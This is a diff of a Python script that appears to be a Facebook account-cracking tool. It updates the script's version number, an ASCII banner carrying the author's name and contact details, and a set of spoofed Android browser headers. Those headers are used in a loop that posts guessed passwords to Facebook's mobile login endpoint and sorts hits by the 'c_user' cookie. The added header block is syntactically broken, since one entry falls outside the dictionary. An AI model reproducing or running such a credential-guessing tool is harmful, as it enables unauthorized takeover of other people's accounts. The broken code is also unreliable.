@@ -71,17 +71,19 @@ db   8D 88b  d88 db. 88  `8b  d8' 88  V888
                                                                                                                              
 \033[1;32m╔══════════════════════════════════╗╔══════════════════════╗
 \033[1;32m║NOTE : \033[37;41mTHIS TOOLS IS FREE\033[0;m\033[1;32m         ║║        \x1b[1;91m___T_\033[1;32m         ║
-\033[1;33m║══════════════════════════════════║║       \x1b[1;91m| o o |\033[1;32m     ║
-\033[1;34m║AUTHOR    : Sujon Be'vies            ║║       \x1b[1;91m|__-__|\033[1;32m        ║
-\033[1;35m║══════════════════════════════════║║       \x1b[1;91m/| []|'\033[1;32m       ║
+\033[1;33m║══════════════════════════════════║║       \x1b[1;91m| o o |\033[1;32m        ║
+\033[1;34m║AUTHOR    : Mr. Sujon             ║║       \x1b[1;91m|__-__|\033[1;32m        ║
+\033[1;35m║══════════════════════════════════║║       \x1b[1;91m/| []|'\033[1;32m        ║
 \033[1;36m║WHATSAPP  : 01617084346          ║║     \x1b[1;91m()/|___|\()\033[1;32m      ║
-\033[1;37m║══════════════════════════════════║║        \x1b[1;91m|_|_|\033[1;32m       ║
-\033[1;38m║GITHUB    :??          ║║       \x1b[1;91m|_| |_|\033[1;32m    ║
-\033[1;39m║══════════════════════════════════║║                         ║
+\033[1;37m║══════════════════════════════════║║        \x1b[1;91m|_|_|\033[1;32m         ║
+\033[1;38m║GITHUB    : sujonbevies            ║║       \x1b[1;91m|_| |_|\033[1;32m        ║
+\033[1;39m║══════════════════════════════════║║                      ║
 \033[1;31m║SERVER    : DATA :      WORKING   ║╚══════════════════════╝
 \033[1;32m║══════════════════════════════════════════════════════════╗
 \033[1;33m║FACEBOOK LINK : \x1b[1;91hhttps://www.facebook.com/sujonbevies\033[1;32m║
-\033[1;36m╚══════════════════════════════════════════════════════════╝\033[1;37m""") 
+\033[1;34m║══════════════════════════════════════════════════════════║
+\033[1;35m║\033[1;32m ║
+\033[1;36m╚══════════════════════════════════════════════════════════╝\033[1;37m""")  
 loop = 0
 oks = []
 cps = []
@@ -102,9 +104,9 @@ else:
     
 try:
     print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
-    v = 0.1
-    update = ('0.1')
-    update = ('0.1')
+    v = 0.2
+    update = ('0.2')
+    update = ('0.2')
     if str(v) in update:
         os.system('clear')
     else:pass
@@ -204,21 +206,27 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'mbasic.facebook.com',
-            "method": 'GET',
-            "scheme": 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro}
+            header_freefb = {'authority': 'mbasic.facebook.com',
+           "method": 'GET',
+           "scheme": 'https',
+           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+           'accept-language': 'en-US,en;q=0.9',
+           'cache-control': 'max-age=0',
+           'dpr': '3',
+           'sec-ch-prefers-color-scheme': 'light',
+           'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+           'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+           'sec-ch-ua-mobile': '?1',
+           'sec-ch-ua-model': '"CPH1723"',
+           'sec-ch-ua-platform': '"Android"',
+           'sec-ch-ua-platform-version': '"7.1.1"',
+           'sec-fetch-dest': 'document',
+           'sec-fetch-mode': 'navigate',
+           'sec-fetch-site': 'none',
+           'sec-fetch-user': '?1',
+           'upgrade-insecure-requests': '1',
+           'user-agent':pro}
+           'viewport-width': '980',
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -245,4 +253,3 @@ def rcrack(uid,pwx,tl):
         pass
  
 xxr()
- 
